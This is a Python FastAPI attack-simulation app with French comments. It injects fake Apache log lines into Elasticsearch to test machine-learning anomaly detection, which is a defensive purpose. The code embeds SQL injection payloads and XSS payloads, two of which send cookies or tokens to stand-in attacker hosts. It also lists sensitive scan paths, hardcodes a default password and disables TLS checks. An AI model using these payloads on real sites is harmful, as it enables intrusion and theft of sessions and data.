import os
import time
import json
import base64
import random
import requests
from datetime import datetime, timezone
from typing import Optional, List
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
import urllib3

# Désactiver les avertissements SSL pour le certificat auto-signé Elasticsearch
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = FastAPI(
    title="Elastic Security & Attack Simulator",
    description="API de simulation d'attaques en temps réel et observabilité Machine Learning",
    version="1.0.0"
)

# Chemins absolus pour les templates et static
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))
app.mount("/static", StaticFiles(directory=os.path.join(BASE_DIR, "static")), name="static")

# Configuration de l'environnement
APACHE_URL = os.getenv("APACHE_URL", "http://localhost:8080")
ES_URL = os.getenv("ES_URL", "https://localhost:9200")
ES_USER = os.getenv("ES_USER", "elastic")
ES_PASS = os.getenv("ES_PASS", "MySecurePassword123!")
ES_AUTH = (ES_USER, ES_PASS)
INDEX_ACCESS = "logs-apache_access-default"
INDEX_ERROR = "logs-apache_error-default"
ML_JOB_ID = os.getenv("ML_JOB_ID", "apache-traffic-anomaly")

# Journal d'activité en mémoire pour le flux direct du dashboard
live_events: List[dict] = []

def record_event(attack_type: str, status: str, details: str, count: int, ip: str):
    evt = {
        "timestamp": datetime.now(timezone.utc).strftime("%H:%M:%S"),
        "type": attack_type,
        "status": status,
        "details": details,
        "count": count,
        "ip": ip
    }
    live_events.insert(0, evt)
    if len(live_events) > 50:
        live_events.pop()

def send_doc_to_es(log_line: str, pipeline: str = "apache-access-pipeline"):
    """Envoie directement une ligne de log dans Elasticsearch via le pipeline spécifié."""
    url = f"{ES_URL}/{INDEX_ACCESS}/_doc?pipeline={pipeline}"
    try:
        requests.post(
            url,
            auth=ES_AUTH,
            json={"message": log_line},
            headers={"Content-Type": "application/json"},
            verify=False,
            timeout=3
        )
    except Exception as e:
        print(f"Erreur envoi ES: {e}")

# Modèles Pydantic
class AttackRequest(BaseModel):
    intensity: Optional[int] = 30
    custom_ip: Optional[str] = None

@app.api_route("/", methods=["GET", "HEAD"], response_class=HTMLResponse)
async def read_root(request: Request):
    """Page d'accueil de l'interface graphique."""
    return templates.TemplateResponse("index.html", {"request": request})

@app.get("/api/stats")
async def get_stats():
    """Récupère les statistiques d'indexation et la santé d'Elasticsearch."""
    es_count = 0
    es_status = "unreachable"
    ml_status = "unknown"

    try:
        # Santé du cluster
        r_health = requests.get(f"{ES_URL}/_cluster/health", auth=ES_AUTH, verify=False, timeout=3)
        if r_health.status_code == 200:
            es_status = r_health.json().get("status", "unknown")

        # Nombre de documents dans logs-apache*
        r_count = requests.get(f"{ES_URL}/logs-apache*/_count", auth=ES_AUTH, verify=False, timeout=3)
        if r_count.status_code == 200:
            es_count = r_count.json().get("count", 0)

        # Statut du job ML
        r_ml = requests.get(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_stats", auth=ES_AUTH, verify=False, timeout=3)
        if r_ml.status_code == 200:
            jobs = r_ml.json().get("jobs", [])
            if jobs:
                ml_status = jobs[0].get("state", "opened")
    except Exception as e:
        print(f"Erreur récupération stats ES: {e}")

    return {
        "es_status": es_status,
        "indexed_docs": es_count,
        "ml_job_id": ML_JOB_ID,
        "ml_status": ml_status,
        "live_events": live_events[:15]
    }

@app.get("/api/alerts")
async def get_alerts():
    """Interroge Elasticsearch pour récupérer les anomalies détectées par le Machine Learning."""
    try:
        url = f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/results/records?sort=record_score&desc=true&size=10"
        r = requests.get(url, auth=ES_AUTH, verify=False, timeout=4)
        if r.status_code == 200:
            data = r.json()
            records = data.get("records", [])
            formatted = []
            for rec in records:
                score = round(rec.get("record_score", 0), 1)
                severity = "low"
                if score >= 75:
                    severity = "critical"
                elif score >= 50:
                    severity = "major"
                elif score >= 25:
                    severity = "moderate"

                formatted.append({
                    "timestamp": datetime.fromtimestamp(rec.get("timestamp", 0) / 1000, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
                    "score": score,
                    "severity": severity,
                    "detector": rec.get("function_description", "count"),
                    "actual": rec.get("actual", [0])[0] if rec.get("actual") else 0,
                    "typical": round(rec.get("typical", [0])[0], 1) if rec.get("typical") else 0,
                    "influencers": [inf.get("influencer_field_values", ["-"])[0] for inf in rec.get("influencers", [])]
                })
            return {"count": len(formatted), "alerts": formatted}
    except Exception as e:
        print(f"Erreur get_alerts: {e}")
    return {"count": 0, "alerts": []}

@app.post("/api/simulate/traffic/normal")
def simulate_normal_traffic(req: AttackRequest = AttackRequest(intensity=20)):
    """Simule un trafic web utilisateur normal (pages légitimes, User-Agent navigateur classique)."""
    ip = req.custom_ip or f"192.168.1.{random.randint(20, 90)}"
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    paths = ["/index.html", "/about.html", "/products", "/contact", "/home", "/assets/app.css", "/assets/logo.png"]
    count = req.intensity or 20

    for _ in range(count):
        p = random.choice(paths)
        now_str = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{ip} - - [{now_str}] "GET {p} HTTP/1.1" 200 {random.randint(150, 4200)} "-" "{ua}"'
        send_doc_to_es(log_line)

    # Rafraîchir
    requests.post(f"{ES_URL}/logs-apache*/_refresh", auth=ES_AUTH, verify=False)
    # Déclencher le flush pour recalcul ML
    requests.post(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_flush?calc_interim=true", auth=ES_AUTH, verify=False)

    record_event("Trafic Normal", "Succès 200 OK", f"{count} requêtes légitimes navigatrices générées", count, ip)
    return {"status": "ok", "message": f"{count} requêtes légitimes envoyées", "ip": ip}

@app.post("/api/simulate/attack/nmap")
def simulate_nmap_scan(req: AttackRequest = AttackRequest(intensity=60)):
    """Simule une reconnaissance automatisée par scanner Nmap."""
    attacker_ip = req.custom_ip or f"45.133.1.{random.randint(10, 250)}"
    ua = "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
    scan_targets = [
        "wp-login.php", "wp-admin", ".env", "config.php", "phpmyadmin",
        "administrator/index.php", "backup.sql", "api/.env", "server-status",
        "shell.php", "actuator/env", "console/", "debug.log"
    ]
    count = req.intensity or 60

    for i in range(count):
        target = scan_targets[i % len(scan_targets)]
        now_str = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{attacker_ip} - - [{now_str}] "GET /{target} HTTP/1.1" 404 196 "-" "{ua}"'
        send_doc_to_es(log_line)

    requests.post(f"{ES_URL}/logs-apache*/_refresh", auth=ES_AUTH, verify=False)
    requests.post(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_flush?calc_interim=true", auth=ES_AUTH, verify=False)

    record_event("Scan Nmap", "Alerte 404", f"Balayage agressif de {count} cibles sensibles d'URLs", count, attacker_ip)
    return {"status": "ok", "message": f"Attaque Scan Nmap déclenchée ({count} probes)", "ip": attacker_ip}

@app.post("/api/simulate/attack/bruteforce")
def simulate_bruteforce(req: AttackRequest = AttackRequest(intensity=50)):
    """Simule une attaque par force brute sur un endpoint d'authentification."""
    attacker_ip = req.custom_ip or f"185.220.101.{random.randint(2, 250)}"
    ua = "Hydra/9.5 (https://github.com/vanhauser-thc/thc-hydra)"
    count = req.intensity or 50

    for _ in range(count):
        now_str = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{attacker_ip} - admin [{now_str}] "POST /login HTTP/1.1" 401 312 "-" "{ua}"'
        send_doc_to_es(log_line)

    requests.post(f"{ES_URL}/logs-apache*/_refresh", auth=ES_AUTH, verify=False)
    requests.post(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_flush?calc_interim=true", auth=ES_AUTH, verify=False)

    record_event("Brute-Force", "Refus 401", f"{count} tentatives consécutives de mot de passe échouées sur /login", count, attacker_ip)
    return {"status": "ok", "message": f"Attaque Brute-force déclenchée ({count} essais)", "ip": attacker_ip}

@app.post("/api/simulate/attack/sqli")
def simulate_sqli(req: AttackRequest = AttackRequest(intensity=40)):
    """Simule des vecteurs d'injection SQL (SQLi)."""
    attacker_ip = req.custom_ip or f"91.240.118.{random.randint(10, 240)}"
    ua = "sqlmap/1.8#stable (https://sqlmap.org)"
    payloads = [
        "1' OR '1'='1",
        "1' UNION SELECT null,username,password FROM users--",
        "1; WAITFOR DELAY '0:0:5'--",
        "admin'--",
        "1' AND 1=1 UNION ALL SELECT 1,table_name FROM information_schema.tables--"
    ]
    count = req.intensity or 40

    for i in range(count):
        sqli_query = payloads[i % len(payloads)]
        encoded_query = urllib3.util.parse_url(f"?id={sqli_query}").query
        now_str = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{attacker_ip} - - [{now_str}] "GET /products.php?{encoded_query} HTTP/1.1" 500 890 "-" "{ua}"'
        send_doc_to_es(log_line)

    requests.post(f"{ES_URL}/logs-apache*/_refresh", auth=ES_AUTH, verify=False)
    requests.post(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_flush?calc_interim=true", auth=ES_AUTH, verify=False)

    record_event("SQL Injection", "Erreur 500", f"{count} requêtes d'exfiltration SQLi vers /products.php", count, attacker_ip)
    return {"status": "ok", "message": f"Attaque SQL Injection injectée ({count} requêtes)", "ip": attacker_ip}

@app.post("/api/simulate/attack/xss")
def simulate_xss(req: AttackRequest = AttackRequest(intensity=30)):
    """Simule des charges utiles Cross-Site Scripting (XSS)."""
    attacker_ip = req.custom_ip or f"194.26.29.{random.randint(5, 250)}"
    ua = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    payloads = [
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=this.src='http://attacker.com/steal?c='+document.cookie>",
        "<svg/onload=fetch('//c2.evil/?'+localStorage.token)>",
        "\"><script>eval(atob('ZG9jdW1lbnQubG9jYXRpb24='))</script>"
    ]
    count = req.intensity or 30

    for i in range(count):
        xss_code = payloads[i % len(payloads)]
        now_str = datetime.now(timezone.utc).strftime("%d/%b/%Y:%H:%M:%S +0000")
        log_line = f'{attacker_ip} - - [{now_str}] "GET /search.php?q={xss_code} HTTP/1.1" 400 245 "-" "{ua}"'
        send_doc_to_es(log_line)

    requests.post(f"{ES_URL}/logs-apache*/_refresh", auth=ES_AUTH, verify=False)
    requests.post(f"{ES_URL}/_ml/anomaly_detectors/{ML_JOB_ID}/_flush?calc_interim=true", auth=ES_AUTH, verify=False)

    record_event("Cross-Site Scripting (XSS)", "Erreur 400", f"{count} injections XSS réfléchies sur /search.php", count, attacker_ip)
    return {"status": "ok", "message": f"Attaque XSS envoyée ({count} requêtes)", "ip": attacker_ip}
